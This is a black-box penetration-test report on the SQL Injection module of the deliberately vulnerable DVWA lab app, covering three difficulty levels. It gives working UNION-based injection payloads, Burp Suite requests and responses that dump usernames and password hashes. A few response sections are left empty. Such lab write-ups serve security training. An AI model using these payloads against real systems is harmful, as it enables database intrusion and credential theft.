## 1. Executive Summary

A black-box penetration test was conducted against the SQL Injection module of the DVWA application running on a local Docker environment. No source code, credentials, or internal documentation were provided prior to or during testing. The objective was to assess the application's resilience against SQL Injection attacks across three security difficulty levels (Low, Medium, High) in accordance with the OWASP Testing Guide (OTG-INPVAL-005).

**Critical finding:** SQL Injection vulnerabilities were successfully exploited across **all three difficulty levels** through external observation and input manipulation alone, enabling full extraction of user credentials from the backend database.

**Business Impact:** An unauthenticated or low-privileged attacker with access to the application's user-facing input fields can extract all stored user credentials from the database. This constitutes a **Critical** severity finding with direct impact on data confidentiality and user account integrity.

### 2.2 Methodology

Testing followed the OWASP Penetration Testing Framework under a **black-box** engagement model. No application source code was reviewed at any stage. All findings were derived solely from observable application behavior — HTTP responses, error messages, and output differences.

```
Phase 1 — Reconnaissance   : Identify input surfaces, HTTP methods, observable behavior
Phase 2 — Analysis         : Infer query structure from error messages and response patterns
Phase 3 — Testing          : Probe inputs with boundary cases and detection payloads
Phase 4 — Exploitation     : Construct UNION-based payloads to extract database content
Phase 5 — Reporting        : Document findings with full POC evidence
```

### 4.1 SQLi — Low Security

**Finding ID:** SQLI-01
**Severity:** High
**CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
**CVSS v3.1 Score:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### 4.1.1 Description

The `id` parameter passed via HTTP GET to `/dvwa/vulnerabilities/sqli/` is processed without sufficient sanitization. Injecting a single quote character (`'`) into the parameter causes the application to return a raw MySQL syntax error, confirming that user input is being interpolated directly into the backend SQL query.

The error response discloses the database engine type and query structure, providing sufficient information to construct a targeted UNION-based injection payload without any prior knowledge of the backend code.

#### 4.1.2 Attack Surface

| Attribute | Value |
|---|---|
| URL | `http://localhost/dvwa/vulnerabilities/sqli/` |
| Method | GET |
| Parameter | `id` |
| Observed Context | String (inferred from single-quote error) |
| Authentication Required | Yes (DVWA session cookie) |

#### 4.1.3 Exploitation — Step by Step

**Step 1 — Confirm injection point**

Payload: `1'`

The application returned a verbose MySQL error, confirming unsanitized input and a string-quoted query context:

```
GET /vulnerabilities/sqli/?id=1'&Submit=Submit HTTP/1.1

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

**Step 2 — Determine column count**

UNION-based injection requires matching the number of columns in the original query. Column count was enumerated via ORDER BY:

```
Payload: 1' ORDER BY 2-- -  →  Normal response (2 columns exist)
GET /vulnerabilities/sqli/?id=1'+order+by+2--+-&Submit=Submit HTTP/1.1

Payload: 1' ORDER BY 3-- -  →  Error (no 3rd column)
GET /vulnerabilities/sqli/?id=1'+order+by+3--+-&Submit=Submit HTTP/1.1
```

Conclusion: Query returns **2 columns**.

**Step 3 — Extract database metadata**

Payload:
```sql
1' UNION SELECT database(), version()-- -

1' UNION SELECT schema_name,null FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

Burp Suite Repeater request:
```
GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+database(),version()--+-&Submit=Submit HTTP/1.1
Host: localhost
Cookie: PHPSESSID=<session>; security=low
```

Response excerpt:
```

<br />Surname: admin</pre>

<pre>ID: 1' UNION SELECT database(),version()-- -

<br />Surname: 10.1.26-MariaDB-0+deb9u1</pre>
```

Burp Suite Repeater request:
```
GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+schema_name,null+FROM+INFORMATION_SCHEMA.SCHEMATA--+-&Submit=Submit HTTP/1.1
```

Response excerpt:
```
<pre>ID: 1' UNION SELECT schema_name,null FROM INFORMATION_SCHEMA.SCHEMATA-- -
<br />First name: dvwa
<br />Surname: </pre>

<pre>ID: 1' UNION SELECT schema_name,null FROM INFORMATION_SCHEMA.SCHEMATA-- -
<br />First name: information_schema

```

Confirmed: database name is `dvwa`, MariaDB version `10.1.26`.

**Step 4 — Enumerate tables**

Payload:
```sql
1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa'-- -

GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+table_name,null+FROM+INFORMATION_SCHEMA.tables+WHERE+table_schema='dvwa'--+-&Submit=Submit HTTP/1.1
```

Response:

Payload:
```
GET /vulnerabilities/sqli/?id='+UNION+SELECT+column_name,'hehe'+FROM+INFORMATION_SCHEMA.columns+WHERE+table_name+='users'--+-&Submit=Submit HTTP/1.1
```

Response:


### 4.2 SQLi — Medium Security

**Finding ID:** SQLI-02
**Severity:** Critical
**CWE:** CWE-89
**CVSS v3.1 Score:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

#### 4.2.1 Description

The Medium difficulty level presents two observable differences from Low:

1. The `id` value is submitted via **HTTP POST**, with a dropdown UI element replacing the free-text field — suggesting an attempt to restrict input to predefined values.
2. Single-quote injection payloads (`1'` and `1''`) produce a syntax error.
3. Commend syntax injection payload (`-- -`) result in a successful query.

Testing revealed that the underlying query operates in a **numeric context** — the `id` value is inserted into SQL without surrounding quotes. As a result, quote-based escaping is irrelevant: a UNION injection payload requiring no quote characters bypasses the defense entirely.

This was confirmed by observing that payloads containing no special characters (e.g. `1 UNION SELECT ...`) produce successful output, while quote-containing payloads (e.g. `1""`) return no results or errors.

#### 4.2.2 Attack Surface

| Attribute | Value |
|---|---|
| URL | `/vulnerabilities/sqli/` |
| Method | POST |
| Parameter | `id` |
| Observed Context | Numeric (inferred — quote injection produces no error) |
| UI Restriction | Dropdown (bypassed via Burp Suite) |

#### 4.2.3 Exploitation

The UI dropdown was bypassed by intercepting the POST request in Burp Suite and manually replacing the `id` value. Since the query context is numeric, no quote characters are required in the payload.

**Burp Suite intercepted and modified POST request:**
```
POST /vulnerabilities/sqli/ HTTP/1.1
Host: localhost
Cookie: PHPSESSID=<session>; security=medium
Content-Type: application/x-www-form-urlencoded

id=1+UNION+SELECT+user,password+FROM+users--+-+&Submit=Submit
```

Application response:
```
ID: 1 UNION SELECT user,password FROM users-- -
First name: admin       | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb     | Surname: e99a18c428cb38d5f260853678922e03
First name: 1337        | Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo       | Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy      | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

**POC Result:** Identical credential dump to SQLI-01 achieved. POST method and UI-level dropdown restriction provided no meaningful security barrier.

### 4.3 SQLi — High Security

**Finding ID:** SQLI-03
**Severity:** High
**CWE:** CWE-89
**CVSS v3.1 Score:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### 4.3.1 Description

The High difficulty introduces a notable architectural change: the `id` input is collected via a **separate popup window** and stored in the user's server-side session, rather than being passed directly in the main page request. This decouples the input from the primary HTTP request, complicating automated scanning and interception.

The popup input field accepts arbitrary text, and single-quote injection causes a behavioral change (no output returned rather than an error), confirming a string-quoted context with active filtering or escaping of quote characters limited to error suppression — but not effective parameterization.

Testing confirmed that a UNION payload with a comment terminator (`-- -`) overrides the row limit restriction, as the comment causes the LIMIT clause to be ignored by the database parser.

#### 4.3.2 Attack Surface

| Attribute | Value |
|---|---|
| URL | `/vulnerabilities/sqli/` (main) + popup |
| Method | POST (popup sets session value) |
| Parameter | `id` (via session, set through popup) |
| Observed Context | String (inferred from behavioral difference on quote injection) |

#### 4.3.3 Exploitation

**Step 1 — Confirm injectable input in popup**

Payload entered in popup: `1'`

Main page returns error message:
```
HTTP/1.1 200 OK
Date: Mon, 01 Jun 2026 05:39:51 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 32
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>Something went wrong.</pre>
```

Payload entered in popup: `1'--+-`

Main page returns results:
```
<pre>
ID: 1'-- -
<br />First name: admin
<br />Surname: admin</pre>
```

Payload entered in popup: `1'+order+by+2--+-`

Main page returns results:
```
<pre>ID: 1' order by 2-- -
<br />First name: admin
<br />Surname: admin</pre>
```

**This confirm the target is vulnerable**

**Step 2 — Union payload inject**

Payload:
```sql
id=1'+union+select+user,password+FROM+users--+-
```


Payload submitted via popup. Main page response:
```

First name: gordonb     | Surname: e99a18c428cb38d5f260853678922e03

First name: smithy      | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
